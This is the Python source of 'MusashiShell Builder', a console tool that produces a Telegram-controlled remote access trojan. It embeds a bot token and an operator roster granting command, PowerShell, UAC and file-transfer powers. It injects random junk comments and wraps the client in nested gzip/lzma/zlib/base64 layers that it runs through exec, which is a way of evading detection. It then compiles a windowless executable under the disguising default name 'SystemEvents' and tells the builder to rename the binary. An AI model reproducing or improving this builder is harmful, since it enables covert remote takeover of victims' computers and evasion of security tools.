import sys, os

if os.name == "nt":
    os.system("")
    os.system("title MusashiShell Builder")
    try:
        import ctypes
        k32 = ctypes.windll.kernel32
        k32.SetConsoleOutputCP(65001)
        k32.SetConsoleCP(65001)
        h = k32.GetStdHandle(-11)
        mode = ctypes.c_uint32()
        k32.GetConsoleMode(h, ctypes.byref(mode))
        k32.SetConsoleMode(h, mode.value | 0x0004)
    except Exception:
        pass
    try:
        import ctypes
        hwnd = ctypes.windll.kernel32.GetConsoleWindow()
        if hwnd:
            ctypes.windll.user32.ShowWindow(hwnd, 3)
    except Exception:
        pass

for _s in (sys.stdout, sys.stderr, sys.stdin):
    try:
        _s.reconfigure(encoding="utf-8", errors="replace")
    except Exception:
        pass

os.environ.setdefault("PYTHONIOENCODING", "utf-8")
os.environ.setdefault("PYTHONUTF8", "1")

import re, shutil, subprocess, time, json, logging, random, string
import base64, gzip, lzma, zlib
from pathlib import Path
from logging.handlers import RotatingFileHandler

from rich.console import Console
from rich.panel import Panel
from rich.prompt import Prompt, Confirm
from rich.progress import Progress, SpinnerColumn, TextColumn, TimeElapsedColumn
from rich.table import Table
from rich.align import Align
from rich.text import Text
from rich import box

try:
    import pyfiglet
except ImportError:
    pyfiglet = None

TEMPLATE   = Path("resources/template.py")
BUILD_ROOT = Path("build")
CONF       = Path("cfg/builder.conf")
ICON       = Path("resources/app.ico")
LOG_DIR    = Path("logs")
LOG_FILE   = LOG_DIR / "builder.log"
DEFAULT_APP_NAME = "SystemEvents"

ROLES      = {"op": 1, "admin": 2, "super": 3}
ROLE_DESC  = {
    "op":    "read-only: /start /help /heartbeat /admins /getfile",
    "admin": "op + /cmd /powershell /uac /putfile /uninstall + shell fallback",
    "super": "admin + receives watchdog alerts",
}

console = Console(legacy_windows=False)


def setup_logging() -> logging.Logger:
    LOG_DIR.mkdir(parents=True, exist_ok=True)

    logger = logging.getLogger("builder")
    logger.setLevel(logging.DEBUG)
    logger.propagate = False

    if not logger.handlers:
        fh = RotatingFileHandler(
            LOG_FILE,
            maxBytes=5 * 1024 * 1024,
            backupCount=5,
            encoding="utf-8",
        )
        fh.setLevel(logging.DEBUG)
        fh.setFormatter(logging.Formatter(
            "%(asctime)s [%(levelname)-7s] %(message)s",
            datefmt="%Y-%m-%d %H:%M:%S",
        ))
        logger.addHandler(fh)

        ch = logging.StreamHandler(sys.stderr)
        ch.setLevel(logging.WARNING)
        ch.setFormatter(logging.Formatter("[%(levelname)s] %(message)s"))
        logger.addHandler(ch)

    return logger


log = setup_logging()
log.info("=" * 70)
log.info("MusashiShell builder started")
log.info("cwd=%s", Path.cwd())
log.info("python=%s", sys.version.split()[0])
log.info("platform=%s", sys.platform)


def clear_terminal():
    try:
        sys.stdout.write("\033[2J\033[3J\033[H")
        sys.stdout.flush()
    except Exception:
        log.exception("clear_terminal failed")


def term_width() -> int:
    try:
        return shutil.get_terminal_size(fallback=(120, 30)).columns
    except Exception:
        return 120


def _random_junk_comments(n: int = 3, min_len: int = 10, max_len: int = 24) -> str:
    alphabet = string.ascii_letters + string.digits
    lines = []
    for _ in range(n):
        length = random.randint(min_len, max_len)
        lines.append("# " + "".join(random.choice(alphabet) for _ in range(length)))
    return "\n".join(lines) + "\n"


def _inject_junk(src: str, junk: str) -> str:
    marker = "# -*- coding: utf-8 -*-\n"
    if marker in src:
        return src.replace(marker, marker + junk, 1)
    return junk + src


def matryoshka_pack(src_code: str) -> str:
    log.debug("matryoshka_pack: input %d bytes", len(src_code))
    packed = base64.b64encode(
        zlib.compress(
            lzma.compress(
                gzip.compress(src_code.encode("utf-8"), compresslevel=9)
            )
        )
    )[::-1].decode()

    body = (
        "_=lambda __:exec(__import__('gzip').decompress("
        "__import__('lzma').decompress("
        "__import__('zlib').decompress("
        "__import__('base64').b64decode(__[::-1])))).decode(),globals());"
        f"_('{packed}')"
    )

    log.debug("matryoshka_pack: output %d bytes (packed body %d bytes)",
              len(body), len(packed))
    return body


def banner():
    clear_terminal()
    if pyfiglet:
        art = pyfiglet.figlet_format("MusashiShell", font="ansi_shadow")
    else:
        art = "=== MusashiShell ===\n"
    console.print(Align.center(Text(art, style="bold cyan")))
    console.print(Align.center(Text("Binary builder  |  MusashiShell", style="dim white")))
    console.print()
    log.debug("banner drawn, term_width=%d", term_width())


def menu() -> str:
    table = Table(box=box.ROUNDED, show_header=False, border_style="cyan", padding=(0, 2))
    table.add_column("k", style="bold yellow", justify="right")
    table.add_column("action")
    table.add_row("[1]", "Set config (incl. admins) and build everything automatically")
    table.add_row("[2]", "Rebuild .exe only")
    table.add_row("[3]", "Regenerate client.py + client_obf.py")
    table.add_row("[4]", "Show current settings")
    table.add_row("[5]", "List built clients")
    table.add_row("[6]", "Clean build/")
    table.add_row("[7]", "Open log file")
    table.add_row("[0]", "Exit")
    console.print(Panel(table, title="[bold green]MusashiShell[/]", border_style="green"))
    return Prompt.ask("[bold cyan]Choice[/]", default="0").strip()


def valid_token(t: str) -> bool:
    return bool(re.fullmatch(r"\d{6,}:[A-Za-z0-9_\-]{30,}", t))


def valid_id(s: str) -> bool:
    return s.lstrip("-").isdigit()


def valid_name(s: str) -> bool:
    return bool(re.fullmatch(r"[A-Za-zА-Яа-я0-9 _\-]{1,40}", s))


def valid_app_name(s: str) -> bool:
    return bool(re.fullmatch(r"[A-Za-z0-9_\-]{1,40}", s))


def slugify(name: str) -> str:
    s = name.strip().replace(" ", "_")
    s = re.sub(r"[^A-Za-z0-9_\-]", "", s)
    return s or "client"


def load_conf() -> dict:
    if CONF.exists():
        try:
            data = json.loads(CONF.read_text(encoding="utf-8"))
            log.debug("config loaded from %s", CONF)
            return data
        except Exception:
            log.exception("config load failed: %s", CONF)
            return {}
    log.debug("config not found at %s", CONF)
    return {}


def save_conf(token: str, admins: dict, name: str, app_name: str):
    CONF.parent.mkdir(parents=True, exist_ok=True)
    payload = {
        "token": token,
        "admins": admins,
        "name": name,
        "app_name": app_name,
    }
    CONF.write_text(json.dumps(payload, indent=2), encoding="utf-8")

    log.info("config saved: name=%r app_name=%r admins=%s token=%s...%s",
             name, app_name,
             {k: v for k, v in admins.items()},
             token[:8] if len(token) > 8 else "***",
             token[-4:] if len(token) > 4 else "***")


def ask_token() -> str:
    while True:
        v = Prompt.ask("[cyan]Bot token[/]").strip()
        if valid_token(v):
            log.debug("token accepted")
            return v
        log.warning("invalid token format rejected")
        console.print("[red][WARN] invalid token format[/]")


def ask_name() -> str:
    while True:
        v = Prompt.ask("[cyan]Client name[/] (e.g. [bold]BOT Charlie[/])").strip()
        if valid_name(v):
            log.debug("client name accepted: %r", v)
            return v
        log.warning("invalid client name rejected: %r", v)
        console.print("[red][WARN] letters/digits/space/_/- only, up to 40 chars[/]")


def ask_app_name(default: str = DEFAULT_APP_NAME) -> str:
    while True:
        v = Prompt.ask(
            "[cyan]App name[/] [dim](exe / task / registry / unit)[/]",
            default=default,
        ).strip()
        if valid_app_name(v):
            log.debug("app name accepted: %r", v)
            return v
        log.warning("invalid app name rejected: %r", v)
        console.print("[red][WARN] letters/digits/_/- only, up to 40 chars[/]")


def show_admins_table(admins: dict):
    t = Table(box=box.SIMPLE, border_style="cyan", show_header=True)
    t.add_column("#", style="dim", justify="right")
    t.add_column("user_id", style="bold")
    t.add_column("role")
    t.add_column("what they get", style="dim")
    for i, (uid, role) in enumerate(admins.items(), 1):
        mark = "⭐" if role == "super" else "🛡" if role == "admin" else "👁"
        t.add_row(str(i), str(uid), f"{mark} {role}", ROLE_DESC.get(role, "?"))
    console.print(t)


def collect_admins(existing: dict | None = None) -> dict:
    admins: dict[str, str] = dict(existing or {})

    console.print(Panel(
        "[bold]Admins are baked into the binary at build time.[/]\n"
        "[dim]They cannot be added, removed, or changed at runtime.\n"
        "To change them you must rebuild the client and redeliver it.[/]\n\n"
        f"roles: [cyan]op[/] < [cyan]admin[/] < [cyan]super[/]\n"
        f"  op    — {ROLE_DESC['op']}\n"
        f"  admin — {ROLE_DESC['admin']}\n"
        f"  super — {ROLE_DESC['super']}",
        border_style="cyan",
        title="[bold]Admin roster[/]",
    ))

    if admins:
        console.print("[dim]Existing roster loaded from builder.conf:[/]")
        show_admins_table(admins)
        if not Confirm.ask("[yellow]Keep and edit this roster?[/]", default=True):
            admins = {}

    while True:
        console.print()
        if admins:
            console.print("[dim]Current roster:[/]")
            show_admins_table(admins)

        console.print("\n[bold]Add entry[/] [dim](blank id to stop)[/]")
        uid_raw = Prompt.ask("[cyan]  user_id[/]", default="").strip()
        if not uid_raw:
            break

        if not valid_id(uid_raw):
            console.print("[red][WARN] user_id must be an integer[/]")
            continue

        uid = str(int(uid_raw))

        if uid in admins:
            console.print(f"[yellow]user {uid} already in roster as {admins[uid]}, overwriting[/]")

        role = Prompt.ask(
            f"[cyan]  role for {uid}[/]",
            choices=list(ROLES.keys()),
            default="admin",
        ).strip().lower()
        if role not in ROLES:
            console.print(f"[red][WARN] role must be one of {list(ROLES)}[/]")
            continue

        admins[uid] = role

    if not admins:
        console.print("[red]Roster is empty. At least one 'super' is required.[/]")
        while True:
            uid_raw = Prompt.ask("[cyan]Primary super user_id[/]").strip()
            if not valid_id(uid_raw):
                console.print("[red][WARN] user_id must be an integer[/]")
                continue
            admins[str(int(uid_raw))] = "super"
            break

    if not any(v == "super" for v in admins.values()):
        console.print("[red]No 'super' in roster. Which user should be super?[/]")
        while True:
            uid_raw = Prompt.ask("[cyan]Promote to super (user_id)[/]").strip()
            if not valid_id(uid_raw):
                console.print("[red][WARN] user_id must be an integer[/]")
                continue
            admins[str(int(uid_raw))] = "super"
            break

    console.print()
    console.print("[green][OK] Final roster:[/]")
    show_admins_table(admins)
    return admins


def _src_signature(path: Path) -> tuple:
    if not path.exists():
        return (0, 0)
    st = path.stat()
    return (int(st.st_mtime), st.st_size)


def _exe_up_to_date(src: Path, exe: Path, sig_cache: Path, extra: Path | None = None) -> bool:
    if not exe.exists() or not sig_cache.exists():
        return False
    try:
        old = json.loads(sig_cache.read_text(encoding="utf-8"))
    except Exception:
        log.exception("failed to read sig cache: %s", sig_cache)
        return False
    src_sig = list(_src_signature(src))
    icon_sig = list(_src_signature(extra)) if extra else [0, 0]
    current = src_sig + icon_sig
    same = old == current
    log.debug("sig check: cache=%s current=%s same=%s", old, current, same)
    return same


def _save_sig(src: Path, sig_cache: Path, extra: Path | None = None):
    src_sig = list(_src_signature(src))
    icon_sig = list(_src_signature(extra)) if extra else [0, 0]
    payload = src_sig + icon_sig
    sig_cache.write_text(json.dumps(payload), encoding="utf-8")
    log.debug("sig saved: %s -> %s", sig_cache, payload)


def paths_for(name: str):
    slug = slugify(name)
    out_dir = BUILD_ROOT / slug
    result = {
        "dir":      out_dir,
        "py":       out_dir / "client.py",
        "obf":      out_dir / "client_obf.py",
        "dist":     out_dir / "dist",
        "work":     out_dir / "work",
        "spec":     out_dir,
        "slug":     slug,
        "exe_name": slug,
        "exe_obf":  slug + "_obf",
    }
    log.debug("paths_for(%r) -> slug=%r dir=%s", name, slug, out_dir)
    return result


def build_py(token: str, admins: dict, name: str, app_name: str = DEFAULT_APP_NAME):
    log.info("build_py start: name=%r app_name=%r admins=%d", name, app_name, len(admins))

    if not TEMPLATE.exists():
        log.error("template missing: %s", TEMPLATE)
        console.print(f"[red][ERR] Missing {TEMPLATE}[/]")
        sys.exit(1)

    try:
        src = TEMPLATE.read_text(encoding="utf-8")
    except Exception:
        log.exception("failed to read template: %s", TEMPLATE)
        console.print(f"[red][ERR] Cannot read {TEMPLATE}[/]")
        sys.exit(1)

    log.debug("template loaded: %d bytes", len(src))

    for ph in ("__TOKEN__", "__ADMINS__", "__NAME__", "__APP_NAME__"):
        if ph not in src:
            log.error("template has no placeholder: %s", ph)
            console.print(f"[red][ERR] template.py has no placeholder {ph}[/]")
            sys.exit(1)

    token_b64 = base64.b64encode(token.encode("utf-8")).decode("ascii")

    admins_json = json.dumps({str(k): v for k, v in admins.items()},
                             separators=(",", ":"), sort_keys=True)
    admins_b64  = base64.b64encode(admins_json.encode("utf-8")).decode("ascii")

    log.debug("secrets base64-encoded (token_b64=%dB, admins_b64=%dB, roster=%s)",
              len(token_b64), len(admins_b64),
              {str(k): v for k, v in admins.items()})

    client_src = (src
                  .replace("__TOKEN__", token_b64)
                  .replace("__ADMINS__", admins_b64)
                  .replace("__NAME__", name)
                  .replace("__APP_NAME__", app_name))

    junk = _random_junk_comments(3)
    client_src = _inject_junk(client_src, junk)
    log.debug("injected junk comments:\n%s", junk)

    obf_src = matryoshka_pack(client_src)

    p = paths_for(name)
    p["dir"].mkdir(parents=True, exist_ok=True)

    with Progress(
        SpinnerColumn(),
        TextColumn(f"[cyan]Generating {p['dir']}..."),
        TimeElapsedColumn(),
        transient=True,
        console=console,
        auto_refresh=True,
        refresh_per_second=10,
    ) as prog:
        t = prog.add_task("g", total=None)
        try:
            p["py"].write_text(client_src, encoding="utf-8")
            log.debug("wrote %s (%d bytes)", p["py"], len(client_src))
        except Exception:
            log.exception("failed to write %s", p["py"])
            raise

        prog.update(t, description="[cyan]client.py written, obfuscating...")

        try:
            p["obf"].write_text(obf_src, encoding="utf-8")
            log.debug("wrote %s (%d bytes)", p["obf"], len(obf_src))
        except Exception:
            log.exception("failed to write %s", p["obf"])
            raise

        time.sleep(0.3)
        prog.update(t, completed=True)

    console.print(f"[green][OK][/]  Clean:      [bold]{p['py']}[/]")
    console.print(f"[green][OK][/]  Obfuscated: [bold]{p['obf']}[/]")
    console.print(f"[green][OK][/]  App name:   [bold cyan]{app_name}[/]")
    console.print(f"[green][OK][/]  Admins:     [bold cyan]{len(admins)}[/] baked in")
    log.info("build_py done: %s, %s", p["py"], p["obf"])
    return p["py"], p["obf"]


def build_exe(name: str, obf: bool = True, force: bool = False):
    log.info("build_exe start: name=%r obf=%s force=%s", name, obf, force)

    if shutil.which("pyinstaller") is None:
        log.error("pyinstaller not in PATH")
        console.print("[red][WARN] PyInstaller not found. pip install pyinstaller[/]")
        return None

    p = paths_for(name)
    p["dist"].mkdir(parents=True, exist_ok=True)
    p["work"].mkdir(parents=True, exist_ok=True)

    src_file = p["obf"] if obf else p["py"]
    if not src_file.exists():
        log.error("source file missing: %s", src_file)
        console.print(f"[red][WARN] Missing file {src_file}[/]")
        return None

    exe_name  = p["exe_obf"] if obf else p["exe_name"]
    tag       = "obf" if obf else "clean"
    exe_path  = p["dist"] / (exe_name + (".exe" if os.name == "nt" else ""))
    sig_cache = p["dir"] / f".sig_{tag}.json"

    icon_arg = ICON if ICON.exists() else None

    if not force and _exe_up_to_date(src_file, exe_path, sig_cache, extra=icon_arg):
        size_mb = exe_path.stat().st_size / 1024 / 1024
        log.info("exe up to date, skip: %s (%.2f MB)", exe_path, size_mb)
        console.print(Panel(
            f"[bold green][SKIP] exe is up to date[/]\n"
            f"[bold]{exe_path}[/]\n"
            f"Size: [cyan]{size_mb:.2f} MB[/]",
            border_style="green"))
        return exe_path

    EXCLUDES = [
        "tkinter", "PIL", "numpy", "pandas", "matplotlib", "scipy",
        "PyQt5", "PyQt6", "PySide2", "PySide6",
        "IPython", "jupyter", "notebook", "pytest",
    ]

    cmd = [
        "pyinstaller",
        "--onefile",
        "--noconsole",
        "--noconfirm",
        "--clean",
        "--log-level", "INFO",
        "--name", exe_name,
        "--icon=NONE",
        "--distpath", str(p["dist"]),
        "--workpath", str(p["work"]),
        "--specpath", str(p["spec"]),
        "--optimize", "2",
    ]

    for mod in EXCLUDES:
        cmd += ["--exclude-module", mod]

    if obf:
        HIDDEN = [
            "asyncio", "atexit", "base64", "getpass", "gzip", "json",
            "logging", "lzma", "os", "pathlib", "platform", "random",
            "shutil", "signal", "socket", "string", "subprocess", "sys",
            "time", "urllib.request", "urllib.error", "uuid", "zlib",
            "ctypes", "functools",
        ]
        if os.name == "nt":
            HIDDEN.append("winreg")

        for mod in HIDDEN:
            cmd += ["--hidden-import", mod]

        cmd += ["--collect-submodules", "aiogram"]
        cmd += ["--collect-submodules", "aiohttp"]

    cmd.append(str(src_file))

    log.info("pyinstaller cmd: %s", " ".join(cmd))
    console.print(f"[yellow][BUILD] PyInstaller ({tag}) ->[/] [bold]{p['dist']}[/]")
    console.print(f"[dim]{' '.join(cmd)}[/]\n")

    t0 = time.time()
    with Progress(
        SpinnerColumn(),
        TextColumn("[cyan]Building..."),
        TimeElapsedColumn(),
        transient=False,
        console=console,
        auto_refresh=True,
        refresh_per_second=10,
    ) as prog:
        prog.add_task("build", total=None)

        try:
            proc = subprocess.Popen(
                cmd,
                stdout=subprocess.PIPE,
                stderr=subprocess.STDOUT,
                text=True,
                encoding="utf-8",
                errors="replace",
            )
        except Exception:
            log.exception("failed to launch pyinstaller")
            console.print("[red][ERR] Failed to launch pyinstaller[/]")
            return None

        out_lines = []
        assert proc.stdout is not None
        for line in proc.stdout:
            line = line.rstrip()
            out_lines.append(line)
            log.debug("pyinstaller | %s", line)
        proc.wait()

    elapsed = time.time() - t0
    log.info("pyinstaller exited code=%s elapsed=%.1fs", proc.returncode, elapsed)

    if proc.returncode != 0:
        tail = "\n".join(out_lines[-40:])
        log.error("pyinstaller failed (code %s):\n%s", proc.returncode, tail)
        console.print(Panel(
            f"[red][ERR] PyInstaller failed (code {proc.returncode}) after {elapsed:.1f}s[/]\n\n"
            f"{tail}",
            border_style="red", title="PyInstaller output"))
        return None

    if not exe_path.exists():
        tail = "\n".join(out_lines[-40:])
        log.error("exe not created despite code 0:\n%s", tail)
        console.print(Panel(
            f"[red][WARN] exe not created (code 0)[/]\n\n{tail}",
            border_style="red"))
        return None

    _save_sig(src_file, sig_cache, extra=icon_arg)
    size_mb = exe_path.stat().st_size / 1024 / 1024
    log.info("build_exe done: %s (%.2f MB, %.1fs)", exe_path, size_mb, elapsed)

    console.print(Panel(
        f"[bold green][OK] Done:[/] [bold]{exe_path}[/]\n"
        f"Client name: [cyan]{name}[/]\n"
        f"Variant: [cyan]{tag}[/]\n"
        f"Size: [cyan]{size_mb:.2f} MB[/]\n"
        f"Time: [cyan]{elapsed:.1f}s[/]\n"
        f"\n"
        f"[red]RENAME THE BINARY![/]",
        border_style="green"))
    return exe_path


def clear_build():
    if not BUILD_ROOT.exists():
        log.debug("clear_build: nothing to clear")
        console.print("[yellow]build/ is already empty[/]")
        return
    if Confirm.ask("[red]Delete build/?[/]", default=False):
        log.warning("clearing build root: %s", BUILD_ROOT)
        try:
            shutil.rmtree(BUILD_ROOT, ignore_errors=True)
            log.info("build root cleared")
            console.print("[green][OK] Cleaned[/]")
        except Exception:
            log.exception("failed to clear build root")
            console.print("[red][ERR] Clean failed (see log)[/]")
    else:
        log.debug("clear_build: cancelled by user")


def show_conf():
    c = load_conf()
    if not c:
        console.print("[yellow]Settings not set yet[/]")
        return
    t = c.get("token", "")
    masked = t[:10] + "..." + t[-4:] if len(t) > 14 else "***"

    table = Table(box=box.SIMPLE, show_header=False, border_style="cyan")
    table.add_column("k", style="bold")
    table.add_column("v")
    table.add_row("Token", masked)
    table.add_row("Client name", str(c.get("name", "-")))
    table.add_row("App name", str(c.get("app_name", DEFAULT_APP_NAME)))

    admins = c.get("admins") or {}
    table.add_row("Admins", f"{len(admins)} baked in")

    console.print(Panel(table, title="Current settings", border_style="cyan"))

    if admins:
        console.print()
        console.print("[bold]Roster:[/]")
        show_admins_table({str(k): v for k, v in admins.items()})

    log.debug("show_conf: name=%r app_name=%r admins=%s",
              c.get("name"), c.get("app_name"), admins)


def list_clients():
    if not BUILD_ROOT.exists() or not any(BUILD_ROOT.iterdir()):
        console.print("[yellow]Nothing built yet[/]")
        return
    table = Table(title="Built clients", box=box.ROUNDED, border_style="cyan")
    table.add_column("Client", style="bold")
    table.add_column("client.py", justify="center")
    table.add_column("client_obf.py", justify="center")
    table.add_column("exe", justify="center")
    table.add_column("exe_obf", justify="center")
    table.add_column("Size", justify="right")

    count = 0
    for d in sorted(BUILD_ROOT.iterdir()):
        if not d.is_dir():
            continue
        py    = d / "client.py"
        obf   = d / "client_obf.py"
        exe_c = d / "dist" / f"{d.name}.exe"
        exe_o = d / "dist" / f"{d.name}_obf.exe"
        if not exe_c.exists():
            exe_c = d / "dist" / d.name
        if not exe_o.exists():
            exe_o = d / "dist" / f"{d.name}_obf"

        sizes = []
        if exe_c.exists(): sizes.append(exe_c.stat().st_size)
        if exe_o.exists(): sizes.append(exe_o.stat().st_size)
        size = f"{max(sizes)/1024/1024:.2f} MB" if sizes else "-"

        table.add_row(
            d.name,
            "Y" if py.exists() else "-",
            "Y" if obf.exists() else "-",
            "Y" if exe_c.exists() else "-",
            "Y" if exe_o.exists() else "-",
            size,
        )
        count += 1
    console.print(table)
    log.debug("list_clients: %d entries", count)


def open_log():
    if not LOG_FILE.exists():
        console.print("[yellow]No log file yet[/]")
        return
    log.info("opening log file: %s", LOG_FILE)
    try:
        if os.name == "nt":
            os.startfile(str(LOG_FILE))
        else:
            subprocess.Popen(["xdg-open", str(LOG_FILE)])
    except Exception:
        log.exception("failed to open log file")
        console.print(f"[red][ERR] Cannot open {LOG_FILE}[/]")


def flow_configure_and_build():
    log.info("flow_configure_and_build start")
    c = load_conf()

    console.print(Panel(
        "[bold]Enter config — everything else runs automatically[/]\n"
        "[dim]Enter = keep current value from builder.conf[/]",
        border_style="cyan"))

    token = Prompt.ask("[cyan]Bot token[/]", default=c.get("token", ""))
    if not token or not valid_token(token):
        token = ask_token()

    name = Prompt.ask("[cyan]Client name[/]", default=c.get("name", "BOT Client"))
    if not name or not valid_name(name):
        name = ask_name()

    app_default = c.get("app_name", DEFAULT_APP_NAME)
    app_name = Prompt.ask(
        "[cyan]App name[/] [dim](exe / task / registry / unit)[/]",
        default=app_default,
    ).strip()
    if not app_name or not valid_app_name(app_name):
        app_name = ask_app_name(app_default)

    console.print()
    existing = c.get("admins") or {}
    admins = collect_admins(existing)

    save_conf(token, admins, name, app_name)
    console.print(
        f"[green][OK] Config saved[/] "
        f"[dim](app name: {app_name}, admins: {len(admins)})[/], starting build...\n"
    )

    build_py(token, admins, name, app_name)

    console.print()
    build_exe(name, obf=True)
    log.info("flow_configure_and_build done")


def flow_regenerate_py():
    log.info("flow_regenerate_py start")
    c = load_conf()
    if not c:
        log.warning("regenerate_py: no config")
        console.print("[red]Set config first (option 1)[/]")
        return
    if not c.get("admins"):
        log.warning("regenerate_py: no admins in config")
        console.print("[red]No admin roster in builder.conf, run option 1[/]")
        return
    build_py(
        c["token"],
        c["admins"],
        c.get("name", "BOT Client"),
        c.get("app_name", DEFAULT_APP_NAME),
    )
    log.info("flow_regenerate_py done")


def flow_rebuild_exe():
    log.info("flow_rebuild_exe start")
    c = load_conf()
    if not c:
        log.warning("rebuild_exe: no config")
        console.print("[red]Set config first (option 1)[/]")
        return

    name = c.get("name", "BOT Client")
    p = paths_for(name)

    if not p["obf"].exists():
        log.warning("client_obf.py missing, regenerating")
        console.print("[yellow]client_obf.py not found, generating...[/]")
        build_py(
            c["token"],
            c["admins"],
            name,
            c.get("app_name", DEFAULT_APP_NAME),
        )

    build_exe(name, obf=True)
    log.info("flow_rebuild_exe done")


def main():
    while True:
        banner()
        choice = menu()
        log.info("menu choice=%r", choice)

        if choice == "1":
            flow_configure_and_build()
            time.sleep(3.0)
        elif choice == "2":
            flow_rebuild_exe()
            time.sleep(3.0)
        elif choice == "3":
            flow_regenerate_py()
            time.sleep(1.5)
        elif choice == "4":
            show_conf()
            time.sleep(2.5)
        elif choice == "5":
            list_clients()
            time.sleep(3.0)
        elif choice == "6":
            clear_build()
            time.sleep(1.0)
        elif choice == "7":
            open_log()
            time.sleep(1.0)
        elif choice == "0":
            log.info("exit requested by user")
            return
        else:
            log.warning("unknown menu choice: %r", choice)


if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        log.warning("interrupted by Ctrl+C")
        console.print("\n[bold red]Interrupted[/]")
        sys.exit(0)
    except SystemExit:
        raise
    except Exception:
        log.exception("unhandled exception in main")
        console.print("[red][ERR] Unhandled exception - see logs/builder.log[/]")
        sys.exit(1)
    finally:
        log.info("builder exited")
        log.info("=" * 70)
        logging.shutdown()